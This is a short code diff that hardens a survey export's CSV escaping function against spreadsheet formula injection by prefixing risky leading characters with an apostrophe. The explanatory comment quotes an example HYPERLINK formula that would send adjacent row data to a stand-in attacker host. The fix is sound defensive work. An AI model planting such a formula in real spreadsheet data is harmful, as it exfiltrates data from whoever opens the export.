@@ -561,7 +561,14 @@ export class RespondentService {
   }
 
   private csvSafe(value: string): string {
-    return value.replace(/"/g, '""');
+    // Neutralize spreadsheet formula triggers (CWE-1236). Excel/Sheets/LibreOffice
+    // evaluate cells starting with =, +, -, @, tab, or CR as formulas, so a
+    // respondent answer like `=HYPERLINK("https://attacker/?d="&A2,"x")` would
+    // exfiltrate adjacent row data when an admin opens the export. Prefix with
+    // a single quote per OWASP CSV Injection guidance — the apostrophe is
+    // stripped from the rendered cell but defangs the formula.
+    const safe = /^[=+\-@\t\r]/.test(value) ? `'${value}` : value;
+    return safe.replace(/"/g, '""');
   }
 
   private async createNewRespondent(surveyId: string, ipAddress: string): Promise<ResumeResult> {
